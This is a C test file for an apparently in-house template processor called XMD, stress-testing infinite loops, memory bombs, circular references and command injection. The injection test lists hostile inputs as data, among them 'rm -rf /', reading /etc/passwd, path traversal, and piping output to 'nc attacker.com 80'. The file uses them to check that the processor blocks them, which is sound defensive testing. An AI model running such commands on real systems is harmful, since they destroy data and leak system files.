/**
 * @file test_resource_exhaustion.c
 * @brief Resource exhaustion and security stress tests
 * @author XMD Team
 * @date 2025-07-27
 * 
 * Tests for resource limits, infinite loops, and security edge cases
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include "../../include/store.h"
#include "../../include/variable.h"

// External functions
char* ast_process_xmd_content(const char* input, store* variables);

// Timeout handler
static volatile int timeout_triggered = 0;
void timeout_handler(int signum) {
    timeout_triggered = 1;
}

/**
 * @brief Test infinite loop detection and prevention
 */
void test_infinite_loop_detection(void) {
    printf("🔥 Testing infinite loop detection...\n");
    
    store* vars = store_create();
    assert(vars != NULL);
    
    const char* infinite_loop_test = 
        "# Infinite Loop Test\n\n"
        "<!-- xmd set counter=0 -->\n"
        "<!-- xmd while true -->\n"  // Potential infinite loop
        "  Loop iteration: {{counter}}\n"
        "  <!-- xmd set counter={{counter + 1}} -->\n"
        "  <!-- xmd if counter > 1000 -->\n"  // Emergency break
        "    <!-- xmd break -->\n"
        "  <!-- xmd endif -->\n"
        "<!-- xmd endwhile -->\n"
        "\nLoop completed with counter: {{counter}}\n";
    
    // Set up timeout (5 seconds max)
    signal(SIGALRM, timeout_handler);
    alarm(5);
    timeout_triggered = 0;
    
    clock_t start = clock();
    char* result = ast_process_xmd_content(infinite_loop_test, vars);
    clock_t end = clock();
    
    alarm(0); // Cancel alarm
    
    double cpu_time = ((double)(end - start)) / CLOCKS_PER_SEC;
    
    if (timeout_triggered) {
        printf("⚠️  Timeout triggered - potential infinite loop detected\n");
    } else if (result) {
        printf("✅ Loop completed safely in %.3f seconds\n", cpu_time);
        
        // Check if emergency break worked
        if (strstr(result, "1000")) {
            printf("✅ Emergency break mechanism functional\n");
        }
        
        free(result);
    } else {
        printf("❌ Loop test failed\n");
    }
    
    store_destroy(vars);
}

/**
 * @brief Test variable explosion (memory bomb)
 */
void test_variable_explosion(void) {
    printf("🔥 Testing variable explosion (memory bomb)...\n");
    
    store* vars = store_create();
    assert(vars != NULL);
    
    // Calculate required buffer size: base + (1000 * (directive_size + content_size + usage))
    // Each variable directive: ~30 chars + 200 chars content + ~25 chars usage = ~255 chars
    // Plus safety margin for base content
    size_t required_size = 50000 + (1000 * 300);  // ~350KB total
    char* bomb_input = malloc(required_size);
    if (!bomb_input) {
        printf("❌ Failed to allocate memory for variable explosion test\n");
        store_destroy(vars);
        return;
    }
    
    strcpy(bomb_input, "# Variable Explosion Test\n\n");
    
    char* pos = bomb_input + strlen(bomb_input);
    char* buffer_end = bomb_input + required_size - 100;  // Safety margin
    
    // Create massive number of variables with bounds checking
    for (int i = 0; i < 1000; i++) {
        // Check remaining buffer space before each operation
        if (pos + 300 > buffer_end) {
            printf("⚠️  Buffer limit reached at variable %d\n", i);
            break;
        }
        
        pos += sprintf(pos, "<!-- xmd set var_%d=\"value_%d_", i, i);
        
        // Add long string content to stress memory
        for (int j = 0; j < 50; j++) {
            pos += sprintf(pos, "data");
        }
        pos += sprintf(pos, "\" -->\n");
        
        // Use some variables to force processing
        if (i % 100 == 0) {
            pos += sprintf(pos, "Variable %d: {{var_%d}}\n", i, i);
        }
    }
    
    pos += sprintf(pos, "\nCreated 1000 variables, used: {{var_0}}, {{var_500}}, {{var_999}}\n");
    
    printf("Generated variable bomb: %zu bytes\n", strlen(bomb_input));
    
    clock_t start = clock();
    char* result = ast_process_xmd_content(bomb_input, vars);
    clock_t end = clock();
    
    double cpu_time = ((double)(end - start)) / CLOCKS_PER_SEC;
    printf("Variable explosion processing time: %.3f seconds\n", cpu_time);
    
    if (result) {
        printf("✅ Variable explosion survived (output: %zu bytes)\n", strlen(result));
        free(result);
    } else {
        printf("❌ Variable explosion caused failure\n");
    }
    
    free(bomb_input);
    store_destroy(vars);
}

/**
 * @brief Test command injection and security validation
 */
void test_command_injection_stress(void) {
    printf("🔥 Testing command injection stress...\n");
    
    store* vars = store_create();
    assert(vars != NULL);
    
    const char* injection_tests[] = {
        // Basic injection attempts
        "<!-- xmd exec rm -rf / -->",
        "<!-- xmd exec cat /etc/passwd -->", 
        "<!-- xmd exec curl evil-site.com -->",
        
        // Command chaining
        "<!-- xmd exec echo test; rm file -->",
        "<!-- xmd exec echo test && evil_command -->",
        "<!-- xmd exec echo test | nc attacker.com 80 -->",
        
        // Variable injection
        "<!-- xmd set cmd=\"rm -rf /\" --><!-- xmd exec {{cmd}} -->",
        
        // Path traversal
        "<!-- xmd exec cat ../../../etc/passwd -->",
        "<!-- xmd exec cat ../../../../../../../../etc/passwd -->",
        
        NULL
    };
    
    int safe_count = 0;
    int total_tests = 0;
    
    for (int i = 0; injection_tests[i] != NULL; i++) {
        total_tests++;
        
        char test_input[1000];
        snprintf(test_input, sizeof(test_input), 
                "# Command Injection Test %d\n\n%s\n\nTest completed.\n",
                i + 1, injection_tests[i]);
        
        char* result = ast_process_xmd_content(test_input, vars);
        
        if (result) {
            // Check if dangerous commands were blocked
            bool seems_safe = true;
            
            // Look for signs of successful execution of dangerous commands
            if (strstr(result, "root:") ||           // /etc/passwd content
                strstr(result, "Permission denied") || // System errors
                strstr(result, "No such file") ||      // File operations
                strstr(result, "Connection") ||        // Network operations
                strstr(result, "/bin/") ||             // System paths
                strstr(result, "Command not found")) { // Shell errors
                
                printf("⚠️  Test %d may have executed dangerous command\n", i + 1);
                seems_safe = false;
            }
            
            if (seems_safe) {
                safe_count++;
            }
            
            free(result);
        } else {
            // NULL result could mean the command was blocked (good)
            safe_count++;
        }
    }
    
    printf("Security test results: %d/%d tests safe\n", safe_count, total_tests);
    
    if (safe_count == total_tests) {
        printf("✅ All command injection attempts properly handled\n");
    } else {
        printf("❌ Some command injection attempts may have succeeded\n");
    }
    
    store_destroy(vars);
}

/**
 * @brief Test recursive template includes (stack overflow)
 */
void test_recursive_template_bomb(void) {
    printf("🔥 Testing recursive template bomb...\n");
    
    store* vars = store_create();
    assert(vars != NULL);
    
    // Create recursive template structure
    const char* recursive_bomb = 
        "# Recursive Template Test\n\n"
        "<!-- xmd set template_a=\"{{template_b}}\" -->\n"
        "<!-- xmd set template_b=\"{{template_c}}\" -->\n"
        "<!-- xmd set template_c=\"{{template_d}}\" -->\n"
        "<!-- xmd set template_d=\"{{template_e}}\" -->\n"
        "<!-- xmd set template_e=\"{{template_a}}\" -->\n"  // Circular reference!
        
        "Starting recursive expansion: {{template_a}}\n"
        "This should not cause infinite recursion.\n";
    
    // Set timeout for stack overflow protection
    signal(SIGALRM, timeout_handler);
    alarm(3);
    timeout_triggered = 0;
    
    char* result = ast_process_xmd_content(recursive_bomb, vars);
    alarm(0);
    
    if (timeout_triggered) {
        printf("⚠️  Timeout triggered - recursive expansion may be infinite\n");
    } else if (result) {
        printf("✅ Recursive template handled safely\n");
        printf("Output length: %zu bytes\n", strlen(result));
        
        // Check for expansion depth limit
        if (strlen(result) < 10000) {  // Reasonable output size
            printf("✅ Recursive expansion properly limited\n");
        } else {
            printf("⚠️  Output suspiciously large - possible runaway expansion\n");
        }
        
        free(result);
    } else {
        printf("❌ Recursive template caused failure\n");
    }
    
    store_destroy(vars);
}

/**
 * @brief Main resource exhaustion test runner
 */
int main(void) {
    printf("🚀 Starting Resource Exhaustion Tests\n");
    printf("=====================================\n\n");
    
    test_infinite_loop_detection();
    printf("\n");
    
    test_variable_explosion();
    printf("\n");
    
    test_command_injection_stress();
    printf("\n");
    
    test_recursive_template_bomb();
    printf("\n");
    
    printf("🎉 Resource Exhaustion Tests Completed!\n");
    printf("🛡️  If you see this message, XMD security held up! 🛡️\n");
    
    return 0;
}